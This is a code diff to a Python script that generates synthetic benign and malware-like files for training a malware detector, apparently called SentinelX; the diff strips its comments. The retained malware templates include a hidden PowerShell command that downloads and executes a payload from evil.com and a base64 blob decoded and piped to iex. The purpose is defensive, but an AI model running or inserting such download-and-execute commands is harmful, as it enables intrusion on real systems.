@@ -1,45 +1,24 @@
-"""
-Synthetic dataset generator for SentinelX ML model.
-
-Since we can't ship actual malware samples, we generate realistic
-synthetic files that have the same statistical fingerprint as real
-malware and benign files.
-
-The key insight: we don't need real malware — we need files whose
-*feature vectors* resemble real malware. Obfuscated scripts, high
-entropy payloads, and suspicious command strings all produce the
-same numeric signature as the real thing.
-"""
-
 import os
 import random
 import string
 import base64
 import math
 
-# ---------------------------------------------------------------------------
-# Safe file templates
-# ---------------------------------------------------------------------------
 
 SAFE_TEXTS = [
-    # config files
     "# Configuration file\nhost=localhost\nport=8080\ndebug=false\nlog_level=info\n",
     "[settings]\ntheme=dark\nlanguage=en\nfont_size=14\nautosave=true\n",
     "version: 1.0\nauthor: user\ndescription: project settings\ncreated: 2024\n",
 
-    # readme / docs
     "# Project README\n\nThis project implements a file scanner.\n\nUsage:\n  python main.py\n\nLicense: MIT\n",
     "Installation guide\n==================\n1. Install Python 3.10+\n2. Run pip install -r requirements.txt\n3. Start the application\n",
 
-    # source code (benign)
     "def calculate_total(items):\n    return sum(item.price for item in items)\n\nclass ShoppingCart:\n    def __init__(self):\n        self.items = []\n",
     "import os\nimport sys\n\ndef main():\n    print('Hello, world')\n    return 0\n\nif __name__ == '__main__':\n    main()\n",
     "const express = require('express');\nconst app = express();\napp.get('/', (req, res) => res.send('OK'));\napp.listen(3000);\n",
 
-    # log files
     "[2024-01-15 10:23:41] INFO Application started\n[2024-01-15 10:23:42] INFO Database connected\n[2024-01-15 10:23:43] INFO Server listening on port 8080\n",
 
-    # data files
     "name,age,city\nAlice,30,New York\nBob,25,London\nCarol,35,Tokyo\n",
     "product_id,price,quantity\n1001,19.99,50\n1002,34.50,20\n1003,9.99,100\n",
 ]
@@ -49,7 +28,6 @@ SAFE_EXTENSIONS = [".txt", ".cfg", ".ini", ".log", ".csv", ".py", ".js", ".md", 
 
 def _make_safe_file(path):
     content = random.choice(SAFE_TEXTS)
-    # add some random lines to vary file size
     extras = random.randint(0, 20)
     for _ in range(extras):
         content += f"# line {random.randint(100, 999)}: {random.choice(string.ascii_letters) * random.randint(5, 30)}\n"
@@ -57,9 +35,6 @@ def _make_safe_file(path):
         f.write(content)
 
 
-# ---------------------------------------------------------------------------
-# Malware file templates
-# ---------------------------------------------------------------------------
 
 MALWARE_POWERSHELL_SNIPPETS = [
     "powershell -hidden -command \"iex (New-Object Net.WebClient).DownloadString('http://evil.com/payload')\"",
@@ -124,11 +99,10 @@ def _make_malware_file(path):
         lines.append(f"$payload = \"{_make_b64_blob(80)}\"")
         lines.append("[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payload)) | iex")
 
-    else:  # .exe placeholder — binary-like high-entropy content
+    else:  
         lines.append(f"MZ_HEADER_{_make_b64_blob(100)}")
         lines += random.choices(MALWARE_CMD_SNIPPETS + MALWARE_POWERSHELL_SNIPPETS, k=random.randint(3, 6))
 
-    # add random padding to vary sizes
     for _ in range(random.randint(0, 10)):
         lines.append(f":: {_make_b64_blob(random.randint(20, 50))}")
 
@@ -136,10 +110,6 @@ def _make_malware_file(path):
     with open(path, "w", encoding="utf-8", errors="ignore") as f:
         f.write(content)
 
-
-# ---------------------------------------------------------------------------
-# Public API
-# ---------------------------------------------------------------------------
 
 def generate_dataset(
     output_dir: str,
